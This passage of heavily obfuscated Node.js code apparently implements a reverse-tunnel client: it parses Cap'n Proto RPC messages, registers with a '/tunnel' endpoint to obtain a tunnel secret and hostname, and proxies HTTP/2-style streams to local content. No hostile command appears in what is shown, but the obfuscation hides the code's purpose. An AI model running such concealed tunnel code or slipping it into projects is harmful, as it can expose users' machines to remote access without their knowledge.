        if (b[hQ(0x5ef)](a[hQ(0xc54)] - d, k))
            break;
        const l = [g];
        for (let n = 0x1; b[hQ(0x15c)](n, h); n++) {
            l[hQ(0xb66)](a[hQ(0xa91)](b[hQ(0x24b)](b[hQ(0xa3d)](d, 0x4), b[hQ(0x889)](n, 0x4))));
        }
        const m = b[hQ(0x24b)](k, b[hQ(0xc09)](l[hQ(0xdfa)]((o, p) => o + p, 0x0), 0x8));
        if (b[hQ(0x15c)](a[hQ(0xc54)] - d, m))
            break;
        if (b[hQ(0xb4f)](h, 0x1))
            throw new Error(b[hQ(0x8bb)]);
        c[hQ(0xb66)](a['subarray'](d + k, b['tCgDz'](d, m))), d += m;
    }
    return [
        c,
        a['subarray'](d)
    ];
}
function a0bk(a, b) {
    const hR = a0d9, c = {
            'QjuQR': function (j, k) {
                return j >= k;
            },
            'UxBPB': hR(0x15f),
            'sPmvD': function (j, k) {
                return j !== k;
            },
            'SAZHl': function (j, k) {
                return j & k;
            },
            'ahQua': hR(0xb96),
            'tciCF': function (j, k) {
                return j >> k;
            },
            'vnQHV': function (j, k) {
                return j + k;
            },
            'BkhKy': function (j, k) {
                return j(k);
            },
            'bEKlz': function (j, k) {
                return j < k;
            }
        };
    if (c['QjuQR'](b, a[hR(0xc54)]))
        throw new Error(c[hR(0x61e)]);
    const d = a[b];
    if (c['sPmvD'](c['SAZHl'](d, 0x3n), 0x0n))
        throw new Error(c[hR(0xe43)]);
    let f = c[hR(0x83e)](c[hR(0x1056)](d, 0x2n), 0x3fffffffn);
    c['SAZHl'](f, 0x20000000n) && (f -= 0x40000000n);
    const g = c['vnQHV'](b, 0x1) + c[hR(0xa79)](Number, f), h = c[hR(0xa79)](Number, c[hR(0x83e)](c[hR(0x1056)](d, 0x20n), 0xffffn)), i = c[hR(0xa79)](Number, c[hR(0x83e)](c[hR(0x1056)](d, 0x30n), 0xffffn));
    if (c['bEKlz'](g, 0x0) || c[hR(0xcc9)](g, h) + i > a[hR(0xc54)])
        throw new Error(c[hR(0x61e)]);
    return [
        g,
        h,
        i
    ];
}
function a0bl(a) {
    const hS = a0d9, b = {
            'fgyQu': function (d, f) {
                return d <= f;
            },
            'NhQtd': function (d, f) {
                return d + f;
            }
        }, c = [];
    for (let d = 0x0; b[hS(0x3d1)](b[hS(0x4c5)](d, 0x8), a[hS(0xc54)]); d += 0x8) {
        c['push'](a['readBigUInt64LE'](d));
    }
    return c;
}
function a0bm(a, b) {
    const hT = a0d9, c = {
            'AujUc': function (p, q) {
                return p >= q;
            },
            'Tcjpn': function (p, q) {
                return p & q;
            },
            'aLYIg': function (p, q) {
                return p !== q;
            },
            'ATEXQ': function (p, q) {
                return p & q;
            },
            'qIskP': function (p, q) {
                return p >> q;
            },
            'mFvZp': function (p, q) {
                return p + q;
            },
            'SePXY': function (p, q) {
                return p(q);
            },
            'kQBQM': function (p, q) {
                return p(q);
            },
            'BspKv': function (p, q) {
                return p >> q;
            },
            'qvWgr': function (p, q) {
                return p < q;
            },
            'YFbIY': function (p, q) {
                return p(q);
            },
            'ZabFm': function (p, q) {
                return p >> q;
            },
            'uzrZv': function (p, q) {
                return p & q;
            },
            'nCIZx': function (p, q) {
                return p(q);
            },
            'orrnp': function (p, q) {
                return p & q;
            },
            'lSZfi': function (p, q) {
                return p >> q;
            },
            'SnLxN': function (p, q) {
                return p + q;
            },
            'KgTaO': function (p, q) {
                return p < q;
            },
            'gXpIg': function (p, q) {
                return p === q;
            },
            'cObHY': function (p, q) {
                return p !== q;
            },
            'OiJhT': function (p, q) {
                return p * q;
            },
            'FMhpE': function (p, q) {
                return p > q;
            },
            'RvvuY': function (p, q) {
                return p + q;
            },
            'MocRV': function (p, q) {
                return p + q;
            },
            'FgGeD': function (p, q) {
                return p + q;
            },
            'ziUoP': function (p, q) {
                return p * q;
            },
            'jrazr': function (p, q, r) {
                return p(q, r);
            },
            'rRmJb': function (p, q) {
                return p + q;
            }
        };
    if (c[hT(0xdc1)](b, a[hT(0xc54)]))
        return null;
    const d = a[b];
    if (c[hT(0xed1)](d, 0x3n) !== 0x1n || c[hT(0x9cb)](c[hT(0x73f)](c[hT(0x106b)](d, 0x20n), 0x7n), 0x7n))
        return null;
    let f = c[hT(0xed1)](d >> 0x2n, 0x3fffffffn);
    f & 0x20000000n && (f -= 0x40000000n);
    const g = c[hT(0x715)](b, 0x1) + c[hT(0x663)](Number, f), h = c['kQBQM'](Number, c[hT(0xdcc)](d, 0x23n));
    if (c[hT(0xc9a)](g, 0x0) || c[hT(0xdc1)](g, a['length']))
        return null;
    const j = a[g];
    if (c['ATEXQ'](j, 0x3n) !== 0x0n)
        return null;
    const k = c[hT(0x209)](Number, c[hT(0xed1)](c[hT(0x604)](j, 0x20n), 0xffffn)), l = Number(c[hT(0x5bc)](c['qIskP'](j, 0x30n), 0xffffn)), m = c[hT(0xbef)](Number, c[hT(0xa55)](c[hT(0xc85)](j, 0x2n), 0x3fffffffn)), n = c['SnLxN'](k, l);
    if (c['KgTaO'](l, 0x2) || c['gXpIg'](n, 0x0) || c[hT(0x148)](c['OiJhT'](n, m), h))
        return null;
    if (c[hT(0x49d)](c[hT(0x1023)](c['MocRV'](g, 0x1), n * m), a['length']))
        return null;
    const o = [];
    for (let p = 0x0; c['qvWgr'](p, m); p++) {
        const q = c[hT(0x369)](g + 0x1, c[hT(0x203)](p, n));
        o[hT(0xb66)]([
            a0bn(a, c['SnLxN'](q, k)),
            c[hT(0x258)](a0bn, a, c[hT(0x99e)](q, k) + 0x1)
        ]);
    }
    return o;
}
function a0bn(a, b) {
    const hU = a0d9, c = {
            'JpxbN': function (m, n) {
                return m !== n;
            },
            'PYGlD': function (m, n) {
                return m & n;
            },
            'lvTYf': function (m, n) {
                return m & n;
            },
            'UtZif': function (m, n) {
                return m >> n;
            },
            'PtYAi': function (m, n) {
                return m & n;
            },
            'hhlQK': function (m, n) {
                return m + n;
            },
            'honXy': function (m, n) {
                return m(n);
            },
            'kKQTO': function (m, n) {
                return m >> n;
            },
            'oWqnk': function (m, n) {
                return m >> n;
            },
            'RCXdf': function (m, n) {
                return m / n;
            },
            'GmUqU': function (m, n) {
                return m > n;
            },
            'HYkTo': function (m, n) {
                return m * n;
            },
            'tLqFD': function (m, n) {
                return m < n;
            }
        };
    if (b >= a['length'])
        return '';
    const d = a[b];
    if (c[hU(0xdbe)](c[hU(0xbc3)](d, 0x3n), 0x1n))
        return '';
    let f = c[hU(0xe78)](c[hU(0x411)](d, 0x2n), 0x3fffffffn);
    c[hU(0x60b)](f, 0x20000000n) && (f -= 0x40000000n);
    const g = c[hU(0xc15)](b, 0x1) + c[hU(0x5cb)](Number, f), h = c[hU(0x5cb)](Number, c['PYGlD'](c[hU(0x692)](d, 0x20n), 0x7n)), j = c[hU(0x5cb)](Number, c[hU(0xb53)](d, 0x23n)), k = Math['ceil'](c[hU(0x477)](j, 0x8));
    if (c[hU(0xdbe)](h, 0x2) || g < 0x0 || c[hU(0xe6d)](g + k, a['length']))
        return '';
    const l = Buffer[hU(0x901)](c[hU(0x494)](k, 0x8));
    for (let m = 0x0; c[hU(0xed6)](m, k); m++) {
        l[hU(0x1e0)](c[hU(0x60b)](a[c[hU(0xc15)](g, m)], 0xffffffffffffffffn), c[hU(0x494)](m, 0x8));
    }
    return l[hU(0xad0)](0x0, j)[hU(0x43a)](hU(0xec2))['replace'](/\0+$/, '');
}
function a0bo(a) {
    const hV = a0d9, b = {
            'aSAJF': function (u, v) {
                return u % v;
            },
            'bloZP': 'short\x20Cap\x27n\x20Proto\x20return',
            'qRwHk': function (u, v) {
                return u(v);
            },
            'gWrgm': function (u, v, w) {
                return u(v, w);
            },
            'esQdq': function (u, v) {
                return u < v;
            },
            'ucluX': function (u, v) {
                return u !== v;
            },
            'dPaRY': function (u, v) {
                return u & v;
            },
            'gOtid': function (u, v) {
                return u + v;
            },
            'dzIlc': function (u, v) {
                return u === v;
            },
            'Eraea': function (u, v) {
                return u + v;
            },
            'vEvVB': function (u, v, w) {
                return u(v, w);
            },
            'ZbmSi': hV(0xcaf),
            'vsWrF': function (u, v) {
                return u + v;
            },
            'kqaib': hV(0x850),
            'KWYHd': function (u, v) {
                return u + v;
            },
            'WvZyP': function (u, v) {
                return u & v;
            },
            'KfYSK': function (u, v, w) {
                return u(v, w);
            },
            'oGkce': function (u, v) {
                return u + v;
            },
            'tttCL': function (u, v) {
                return u + v;
            },
            'VClBx': function (u, v) {
                return u > v;
            },
            'enVwa': function (u, v, w) {
                return u(v, w);
            },
            'oSIUu': function (u, v) {
                return u + v;
            },
            'oqpXj': function (u, v) {
                return u || v;
            }
        };
    if (b[hV(0x61a)](a['length'], 0x8) || a[hV(0xc54)] < 0x10)
        throw new Error(b['bloZP']);
    const c = b['qRwHk'](a0bl, a);
    let d, f, g;
    [d, f, g] = b[hV(0x7fc)](a0bk, c, 0x0);
    if (b[hV(0x83c)](f, 0x1) || b[hV(0x883)](b[hV(0x3dd)](c[d], 0xffffn), 0x3n))
        throw new Error('not\x20an\x20RPC\x20return\x20message');
    const [h, i, j] = a0bk(c, b[hV(0xc68)](d, f)), k = b['qRwHk'](Number, c[h] >> 0x30n & 0xffffn);
    if (b['dzIlc'](k, 0x4)) {
        const [u, v] = a0bk(c, b[hV(0xfd7)](h, i));
        return {
            'ok': ![],
            'error': b[hV(0x5c3)](a0bn, c, b[hV(0xc68)](u, v)) || b[hV(0x4aa)]
        };
    }
    if (k !== 0x0)
        return {
            'ok': ![],
            'error': b[hV(0xfd7)](hV(0xfa1), k)
        };
    const [l, m, n] = b[hV(0x5c3)](a0bk, c, b[hV(0x780)](h, i));
    if (!n)
        return {
            'ok': ![],
            'error': b['kqaib']
        };
    const o = c[b['KWYHd'](l, m)];
    if (b[hV(0xc0d)](b[hV(0x3c4)](o, 0x3n), 0x3n))
        return {
            'ok': ![],
            'bootstrap': !![]
        };
    let p, q, r;
    [p, q, r] = b['KfYSK'](a0bk, c, b[hV(0x31c)](l, m));
    b[hV(0xc0d)](q, 0x0) && b[hV(0xc0d)](r, 0x1) && ([p, q, r] = b[hV(0x7fc)](a0bk, c, b[hV(0xd83)](p, q)));
    const s = b[hV(0x47f)](q, 0x0) ? Number(c[p] & 0xffffn) : 0x0;
    if (b[hV(0xc0d)](s, 0x1)) {
        const [w, x] = b[hV(0x7fc)](a0bk, c, b[hV(0x1ac)](p, q)), y = b[hV(0xd7e)](a0bn, c, b[hV(0xd83)](w, x) + 0x1);
        return {
            'ok': !![],
            'location': y
        };
    }
    const t = a0bn(c, b['oSIUu'](p, q));
    return {
        'ok': ![],
        'error': b[hV(0x48f)](t, b[hV(0x4aa)])
    };
}
function a0bp(a) {
    const hW = a0d9, b = {
            'tqOYD': function (h, i) {
                return h(i);
            },
            'yYdlc': function (h, i, j) {
                return h(i, j);
            },
            'HXHNG': function (h, i) {
                return h < i;
            },
            'QbNnw': hW(0x153),
            'koLrr': function (h, i, j) {
                return h(i, j);
            },
            'XLHJn': function (h, i) {
                return h + i;
            },
            'bFOJr': function (h, i) {
                return h(i);
            },
            'kJhKr': function (h, i, j) {
                return h(i, j);
            }
        }, c = b['tqOYD'](a0bl, a);
    if (!c['length'])
        throw new Error(hW(0xa17));
    let d, f, g;
    [d, f, g] = b['yYdlc'](a0bk, c, 0x0);
    if (b['HXHNG'](f, 0x1) || g < 0x2)
        throw new Error(b[hW(0xf76)]);
    return {
        'dest': b['koLrr'](a0bn, c, b[hW(0xf9c)](d, f)),
        'type': b[hW(0xd58)](Number, c[d] & 0xffffn),
        'metadata': b[hW(0x5fc)](a0bm, c, b[hW(0xf9c)](d + f, 0x1)) || []
    };
}
function a0bq(a, b) {
    const hX = a0d9, c = {
            'HoORT': function (h, i) {
                return h + i;
            },
            'bmCAU': function (h, i) {
                return h || i;
            },
            'ltJph': function (h, i) {
                return h + i;
            }
        }, d = new a0bg(), f = d[hX(0x901)](0x1), g = d[hX(0x901)](0x2);
    return d[hX(0x54f)](f, g, 0x0, 0x2), d[hX(0xfdb)](g, c[hX(0x5c8)](a, ''), !![]), d[hX(0xe3d)](c[hX(0xa0b)](g, 0x1), b['length'], 0x0, 0x2, (h, i) => {
        const hY = hX;
        d[hY(0xfdb)](i, b[h][0x0], !![]), d[hY(0xfdb)](c[hY(0xa9c)](i, 0x1), b[h][0x1], !![]);
    }), d[hX(0xf7a)]();
}
const a0br = {
    '.js': a0d9(0x5b5),
    '.mjs': a0d9(0x5b5),
    '.css': a0d9(0xb4c),
    '.json': a0d9(0x19e),
    '.map': a0d9(0x19e),
    '.wasm': a0d9(0x697),
    '.html': 'text/html;\x20charset=utf-8',
    '.htm': a0d9(0x89b),
    '.svg': a0d9(0x88e),
    '.xml': a0d9(0x8e6),
    '.woff': a0d9(0xb5e),
    '.woff2': a0d9(0xb5e),
    '.png': a0d9(0x1041),
    '.jpg': 'image/jpeg',
    '.jpeg': a0d9(0xd53),
    '.gif': 'image/gif',
    '.ico': 'image/x-icon'
};
function a0bs(a) {
    const hZ = a0d9, b = {
            'LBeKh': function (f, g) {
                return f < g;
            }
        }, c = a['endsWith']('/') ? a[hZ(0x47b)](0x0, -0x1) : a, d = c[hZ(0xf60)]('.');
    if (b[hZ(0x68b)](d, 0x0))
        return '';
    return a0br[c[hZ(0x47b)](d)[hZ(0x544)]()] || '';
}
function a0bt(a) {
    const i0 = a0d9, b = {
            'zvKkr': i0(0xba0),
            'LOqUa': function (c, d) {
                return c % d;
            },
            'ffKbZ': i0(0x66e)
        };
    if (Array[i0(0xedd)](a))
        return Buffer[i0(0xca5)](a);
    if (typeof a !== b[i0(0xb78)])
        throw new Error(i0(0xaf1));
    return Buffer['from'](a + '='[i0(0x221)](b['LOqUa'](-a[i0(0xc54)], 0x4)), b[i0(0xc0f)]);
}
const a0bu = /^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$/;
function a0bv(a) {
    const i1 = a0d9, b = {
            'TpRco': function (c, d) {
                return c + d;
            },
            'trymP': i1(0x545),
            'jljdW': i1(0xf7b),
            'EMxZE': i1(0x9c9),
            'spcrb': i1(0xba0),
            'gurJw': 'bad\x20account\x20tag\x20or\x20hostname',
            'SJjdL': i1(0x1a2),
            'jfGBx': i1(0xe83),
            'wbcHC': 'end',
            'Pbaha': function (c, d) {
                return c + d;
            },
            'kUrNC': i1(0x104a),
            'FZeYB': function (c, d) {
                return c === d;
            },
            'ciZIj': 'https:',
            'ivzPh': i1(0xea9),
            'rzvkl': i1(0xc38),
            'CGqeV': i1(0xfcc)
        };
    return new Promise((c, d) => {
        const i2 = i1;
        let f;
        try {
            f = new URL(b[i2(0xaf3)](a[i2(0x8d4)](/\/+$/, ''), '/tunnel'));
        } catch (i) {
            d(new Error(b[i2(0xacf)] + i[i2(0x769)]));
            return;
        }
        const g = b[i2(0xa8c)](f[i2(0x971)], b[i2(0xefd)]) ? a0h : a0g, h = g[i2(0xfc5)](f, {
                'method': i2(0xe14),
                'headers': {
                    'Content-Type': b[i2(0xe6b)],
                    'User-Agent': b[i2(0x158)]
                },
                'timeout': 0x3a98
            }, j => {
                const i3 = i2, k = {
                        'LZArI': i3(0xec2),
                        'itsmx': function (m, n) {
                            const i4 = i3;
                            return b[i4(0x248)](m, n);
                        },
                        'AzYMp': function (m, n) {
                            const i5 = i3;
                            return b[i5(0x248)](m, n);
                        },
                        'jzedI': function (m, n) {
                            return m + n;
                        },
                        'tzGKW': b['trymP'],
                        'Lnehd': b[i3(0xaed)],
                        'UxaAE': function (m, n) {
                            return m(n);
                        },
                        'OHJzh': function (m, n) {
                            return m(n);
                        },
                        'VyapX': b['EMxZE'],
                        'aHYyJ': function (m, n) {
                            return m !== n;
                        },
                        'sAtdr': b[i3(0x171)],
                        'etJmT': function (m, n) {
                            return m !== n;
                        },
                        'zfTdm': b[i3(0xe15)],
                        'vtSnU': b['SJjdL'],
                        'JTisA': function (m, n) {
                            return m(n);
                        },
                        'dUhLb': i3(0xd35)
                    }, l = [];
                j['on'](b['jfGBx'], m => l[i3(0xb66)](m)), j['on'](i3(0xfcc), d), j['on'](b[i3(0x2ce)], () => {
                    const i6 = i3, m = Buffer['concat'](l), n = j[i6(0xafa)];
                    let o;
                    try {
                        o = JSON[i6(0xadd)](m[i6(0x43a)](k['LZArI']));
                    } catch (q) {
                        d(new Error(k[i6(0x25a)](k[i6(0x34a)](k[i6(0x863)](k['tzGKW'], n), k['Lnehd']), m[i6(0xad0)](0x0, 0x12c)[i6(0x43a)](k[i6(0x74f)]))));
                        return;
                    }
                    const p = o[i6(0x1009)] || {};
                    if (!(o['success'] ?? !![]) || !p) {
                        k[i6(0x8dd)](d, new Error(i6(0xadc) + JSON[i6(0x41c)](o[i6(0xadf)])));
                        return;
                    }
                    try {
                        const r = k[i6(0x39b)](String, p['id']);
                        if (!a0bu[i6(0xf92)](r))
                            throw new Error(k['VyapX']);
                        if (k[i6(0xb32)](typeof p['account_tag'], k[i6(0xfd9)]) || k[i6(0x1ad)](typeof p[i6(0x8d1)], k['sAtdr']))
                            throw new Error(k['zfTdm']);
                        const s = k[i6(0x39b)](a0bt, p[i6(0xf41)]), t = Buffer[i6(0xca5)](r['replace'](/-/g, ''), k[i6(0x440)]);
                        k[i6(0xada)](c, [
                            p[i6(0x8d1)],
                            p[i6(0x16c)],
                            s,
                            t
                        ]);
                    } catch (u) {
                        d(new Error(k[i6(0x863)](k[i6(0x1bf)], u[i6(0x769)])));
                    }
                });
            });
        h['on'](b[i2(0xa83)], j => d(new Error(i2(0x104a) + j[i2(0x769)]))), h[i2(0xdc9)]();
    });
}
function a0bw(a) {
    const i7 = a0d9;
    return a[i7(0xf2e)](([b, c]) => Buffer[i7(0xca5)](b, i7(0xec2))[i7(0x43a)]('base64')['replace'](/=+$/, '') + ':' + Buffer['from'](c, i7(0xec2))[i7(0x43a)](i7(0x66e))[i7(0x8d4)](/=+$/, ''))[i7(0xd9d)](';');
}
class a0bx {
    constructor(a) {
        const i8 = a0d9, b = {
                'YDTQl': i8(0x5d7),
                'ROjNY': 'error',
                'yTkoD': i8(0x76b),
                'UCaje': 'data',
                'EkdoF': 'end'
            }, c = b[i8(0x229)][i8(0xa6a)]('|');
        let d = 0x0;
        while (!![]) {
            switch (c[d++]) {
            case '0':
                a['on'](b['ROjNY'], f => {
                    const i9 = i8;
                    this[i9(0x400)] = f, this[i9(0xd87)]();
                });
                continue;
            case '1':
                this['closed'] = ![];
                continue;
            case '2':
                a['on'](b[i8(0xc8d)], () => {
                    const ia = i8;
                    this['closed'] = !![], this[ia(0xd87)]();
                });
                continue;
            case '3':
                this['socket'] = a;
                continue;
            case '4':
                a['on'](b[i8(0xc04)], f => {
                    const ib = i8;
                    this[ib(0x82f)] = this[ib(0x82f)][ib(0xc54)] ? Buffer['concat']([
                        this[ib(0x82f)],
                        f
                    ]) : f, this['_drain']();
                });
                continue;
            case '5':
                a['on'](b['EkdoF'], () => {
                    const ic = i8;
                    this[ic(0x59e)] = !![], this[ic(0xd87)]();
                });
                continue;
            case '6':
                this['waiters'] = [];
                continue;
            case '7':
                this[i8(0x400)] = null;
                continue;
            case '8':
                this[i8(0x82f)] = Buffer[i8(0x901)](0x0);
                continue;
            }
            break;
        }
    }
    [a0d9(0xd87)]() {
        const id = a0d9, a = {
                'wsgPz': function (b, c) {
                    return b > c;
                },
                'BUeBy': function (b, c) {
                    return b >= c;
                },
                'ySYcF': function (b, c) {
                    return b !== c;
                }
            };
        while (a[id(0x1026)](this[id(0xa41)]['length'], 0x0)) {
            const b = this[id(0xa41)][0x0];
            if (a[id(0x1a1)](this['buffer'][id(0xc54)], b['need'])) {
                this['waiters'][id(0x719)]();
                const c = this[id(0x82f)][id(0xad0)](0x0, b['need']);
                this[id(0x82f)] = this[id(0x82f)][id(0xad0)](b[id(0xd9f)]), b[id(0x5a0)](c);
            } else {
                if (a[id(0x4dc)](this[id(0x400)], null))
                    this['waiters']['shift'](), b[id(0x8db)](this[id(0x400)]);
                else {
                    if (this[id(0x59e)])
                        this[id(0xa41)]['shift'](), b['reject'](new Error('connection\x20closed'));
                    else
                        break;
                }
            }
        }
    }
    [a0d9(0x658)](a) {
        const ie = a0d9, b = {
                'tMofl': function (c, d) {
                    return c !== d;
                },
                'CENKF': function (c, d) {
                    return c >= d;
                },
                'FqtrB': ie(0xe6e)
            };
        if (b[ie(0x904)](this['errored'], null))
            return Promise[ie(0x8db)](this['errored']);
        if (b[ie(0x688)](this['buffer'][ie(0xc54)], a)) {
            const c = this['buffer'][ie(0xad0)](0x0, a);
            return this[ie(0x82f)] = this[ie(0x82f)][ie(0xad0)](a), Promise[ie(0x5a0)](c);
        }
        if (this[ie(0x59e)])
            return Promise[ie(0x8db)](new Error(b[ie(0x1c5)]));
        return new Promise((d, f) => {
            const ig = ie;
            this[ig(0xa41)][ig(0xb66)]({
                'need': a,
                'resolve': d,
                'reject': f
            }), this[ig(0xd87)]();
        });
    }
}
class a0by {
    constructor(a, b, c, d, f, g, h, i = null, j = ![], k = null) {
        const ih = a0d9, l = { 'UFnNs': ih(0x6d3) }, m = l[ih(0x56d)][ih(0xa6a)]('|');
        let n = 0x0;
        while (!![]) {
            switch (m[n++]) {
            case '0':
                this[ih(0xb07)] = d;
                continue;
            case '1':
                this[ih(0x2e4)] = f;
                continue;
            case '2':
                this[ih(0x4c7)] = h;
                continue;
            case '3':
                this[ih(0x50a)] = a;
                continue;
            case '4':
                this[ih(0xfc8)] = null;
                continue;
            case '5':
                this[ih(0x550)] = a0b3;
                continue;
            case '6':
                this[ih(0x9c3)] = new Map();
                continue;
            case '7':
                this[ih(0xa25)] = c;
                continue;
            case '8':
                this[ih(0x63c)] = new a0bx(a);
                continue;
            case '9':
                this[ih(0x70f)] = j;
                continue;
            case '10':
                this[ih(0xb67)] = new Map();
                continue;
            case '11':
                this[ih(0xbb7)] = k || { 'printed': ![] };
                continue;
            case '12':
                this[ih(0xcf3)] = ![];
                continue;
            case '13':
                this['registrationFailed'] = ![];
                continue;
            case '14':
                this[ih(0x394)] = ![];
                continue;
            case '15':
                this[ih(0x8fd)] = i;
                continue;
            case '16':
                this[ih(0x324)] = b;
                continue;
            case '17':
                this[ih(0x3b7)] = 0xffff;
                continue;
            case '18':
                this['connIndex'] = g;
                continue;
            case '19':
                this[ih(0xf5d)] = new a0bc();
                continue;
            case '20':
                this[ih(0x599)] = [];
                continue;
            }
            break;
        }
    }
    [a0d9(0x4ee)](a, b, c, d = Buffer[a0d9(0x901)](0x0)) {
        const ii = a0d9, f = {
                'Nucgq': function (h, i) {
                    return h > i;
                },
                'VPduF': ii(0xeb5),
                'MJZhZ': function (h, i) {
                    return h & i;
                }
            };
        if (f[ii(0x926)](d['length'], 0xffffff))
            throw new Error(f[ii(0x7f7)]);
        const g = Buffer['alloc'](0x9);
        g[ii(0xd1e)](d[ii(0xc54)], 0x0, 0x3), g[0x3] = a, g[0x4] = b, g[ii(0xb3f)](f[ii(0x1bd)](c, 0x7fffffff), 0x5), this[ii(0x50a)][ii(0xc5e)](Buffer[ii(0x83f)]([
            g,
            d
        ]));
    }
    [a0d9(0xc79)](a, b, c = ![]) {
        const ij = a0d9, d = a0bf(b), f = 0x4 | (c ? 0x1 : 0x0);
        this[ij(0x4ee)](0x1, f, a, d);
    }
    [a0d9(0xeb1)](a) {
        const ik = a0d9, b = {
                'WxtWG': function (c, d) {
                    return c > d;
                }
            };
        if (b['WxtWG'](this[ik(0x3b7)], 0x0) && b[ik(0x1071)](this[ik(0xb67)][ik(0xb12)](a) ?? 0xffff, 0x0))
            return Promise['resolve']();
        return new Promise(c => {
            const il = ik;
            this[il(0x599)][il(0xb66)]({
                'streamId': a,
                'resolve': c
            });
        });
    }
    [a0d9(0xcfd)]() {
        const im = a0d9, a = {
                'hckmx': function (c, d) {
                    return c > d;
                }
            }, b = [];
        for (const c of this[im(0x599)]) {
            const d = this['streamWindows'][im(0xb12)](c[im(0x68d)]) ?? 0xffff;
            a[im(0x4e5)](this[im(0x3b7)], 0x0) && d > 0x0 ? c[im(0x5a0)]() : b['push'](c);
        }
        this[im(0x599)] = b;
    }
    [a0d9(0xbee)]() {
        const io = a0d9;
        for (const a of this[io(0x599)]) {
            a[io(0x5a0)]();
        }
        this[io(0x599)] = [];
    }
    async [a0d9(0x7f2)](a, b, c = ![]) {
        const ip = a0d9, d = {
                'TOInD': function (h, i) {
                    return h >= i;
                },
                'mGtmD': function (h, i) {
                    return h + i;
                },
                'EpHTH': function (h, i) {
                    return h - i;
                },
                'bjcDO': function (h, i) {
                    return h < i;
                }
            }, f = b[ip(0xc54)];
        let g = 0x0;
        do {
            await this[ip(0xeb1)](a);
            if (this[ip(0x394)])
                return;
            const h = this['streamWindows']['get'](a) ?? 0xffff, i = Math[ip(0x100f)](f - g, this[ip(0x3b7)], h, this[ip(0x550)]), j = c && d[ip(0xd55)](d[ip(0xc30)](g, i), f) ? 0x1 : 0x0, k = b['subarray'](g, g + i);
            this[ip(0x3b7)] -= i, this['streamWindows'][ip(0x42d)](a, d[ip(0x54c)](h, i)), this[ip(0x4ee)](0x0, j, a, k), g += i;
        } while (d[ip(0x495)](g, f));
    }
    [a0d9(0x940)](a, b) {
        const iq = a0d9, c = {
                'wefKQ': function (d, f) {
                    return d > f;
                },
                'mEqde': function (d, f) {
                    return d & f;
                }
            };
        if (c[iq(0xbd1)](b, 0x0)) {
            const d = Buffer[iq(0x901)](0x4);
            d[iq(0xb3f)](c['mEqde'](b, 0x7fffffff), 0x0), this[iq(0x4ee)](0x8, 0x0, a, d);
        }
    }
    async ['readFrame']() {
        const ir = a0d9, a = {
                'NrxFS': function (i, j) {
                    return i & j;
                }
            }, b = await this[ir(0x63c)][ir(0x658)](0x9), c = b[ir(0x4bc)](0x0, 0x3), d = b[0x3], f = b[0x4], g = a[ir(0x1019)](b['readUInt32BE'](0x5), 0x7fffffff), h = await this[ir(0x63c)][ir(0x658)](c);
        return [
            d,
            f,
            g,
            h
        ];
    }
    async [a0d9(0xa50)](a, b, c) {
        const is = a0d9, d = {
                'rneyp': function (g, h) {
                    return g & h;
                },
                'iDPyF': function (g, h) {
                    return g > h;
                },
                'aLiBM': function (g, h) {
                    return g !== h;
                },
                'jyLuH': function (g, h) {
                    return g !== h;
                }
            };
        if (d[is(0x8af)](a, 0x8)) {
            const g = c[0x0];
            c = c[is(0xad0)](0x1);
            if (d['iDPyF'](g, c['length']))
                throw new Error(is(0x586));
            c = g ? c[is(0xad0)](0x0, c['length'] - g) : c;
        }
        a & 0x20 && (c = c[is(0xad0)](0x5));
        const f = [c];
        while (!(a & 0x4)) {
            const h = await this['readFrame']();
            if (d['aLiBM'](h[0x0], 0x9) || d[is(0xf39)](h[0x2], b))
                throw new Error(is(0x450));
            f[is(0xb66)](h[0x3]), a = h[0x1];
        }
        return this['decoder']['decode'](Buffer[is(0x83f)](f));
    }
    [a0d9(0xa44)](a) {
        const it = a0d9, b = {
                'gghAP': function (c, d) {
                    return c !== d;
                },
                'CNeRk': it(0x6ab)
            };
        if (b[it(0xa85)](this['control'], null))
            return;
        this[it(0xfc8)] = new a0bA(this, a, this[it(0x4c7)]), this[it(0xc79)](a, [[
                it(0x8c8),
                b[it(0x44a)]
            ]]), this[it(0xfc8)][it(0x373)](this[it(0xa25)], this['tunnelSecret'], this[it(0x2e4)], this[it(0x172)]);
    }
    [a0d9(0xdd0)](a, b) {
        const iu = a0d9, c = {
                'dabcS': 'utf8',
                'vOqxa': function (g, h, i) {
                    return g(h, i);
                },
                'wmZVl': iu(0x6ab),
                'xdile': 'content-type',
                'UBmpj': iu(0xea9),
                'kiDvY': iu(0x8b6),
                'dPOId': function (g, h) {
                    return g(h);
                }
            };
        let d = 0x0;
        try {
            const g = JSON[iu(0xadd)](b['length'] ? b[iu(0x43a)](c[iu(0xfb1)]) : '{}'), h = c[iu(0x4d2)](parseInt, g[iu(0x227)], 0xa);
            !Number[iu(0x878)](h) && (d = h);
        } catch (i) {
        }
        const f = Buffer[iu(0xca5)](JSON[iu(0x41c)]({ 'latestAppliedVersion': d }));
        this[iu(0xc79)](a, [
            [
                iu(0x8c8),
                c['wmZVl']
            ],
            [
                c[iu(0xcd3)],
                c[iu(0xdf6)]
            ],
            [
                c['kiDvY'],
                c[iu(0xb45)](String, f[iu(0xc54)])
            ]
        ]), this['sendData'](a, f, !![]);
    }
    ['requestFinished'](a, b) {
        const iv = a0d9, c = {
                'jijte': function (d, f) {
                    return d === f;
                },
                'XYlke': iv(0xf8b)
            };
        if (c[iv(0x590)](b[iv(0xfe6)], c[iv(0xe3f)])) {
            this[iv(0xdd0)](a, Buffer[iv(0x83f)](b[iv(0x344)]));
            return;
        }
        if (b['websocket'])
            return;
        if (b[iv(0x329)])
            return;
        b[iv(0x329)] = !![], this[iv(0xede)](a, b)[iv(0x92f)](() => {
        });
    }
    async ['proxyRequest'](a, b) {
        const iw = a0d9, c = {
                'xIDws': function (d, f, g, h, i, j) {
                    return d(f, g, h, i, j);
                },
                'dxaoB': iw(0x8b6),
                'zjDWZ': iw(0xddc),
                'KhKBX': iw(0x25d),
                'vZsHX': function (d, f) {
                    return d === f;
                },
                'cdYKD': iw(0x9dd),
                'kkpGV': iw(0xfe6),
                'sPedT': function (d, f) {
                    return d === f;
                },
                'KqHVj': function (d, f) {
                    return d(f);
                },
                'dUuhS': 'content-type',
                'bLdsk': function (d, f) {
                    return d(f);
                },
                'kEejy': iw(0x8c8),
                'zwEUv': function (d, f) {
                    return d(f);
                },
                'CFvGf': iw(0x8d3),
                'dEhWG': iw(0xc53),
                'ukInF': function (d, f) {
                    return d + f;
                },
                'zXhmz': function (d, f) {
                    return d + f;
                },
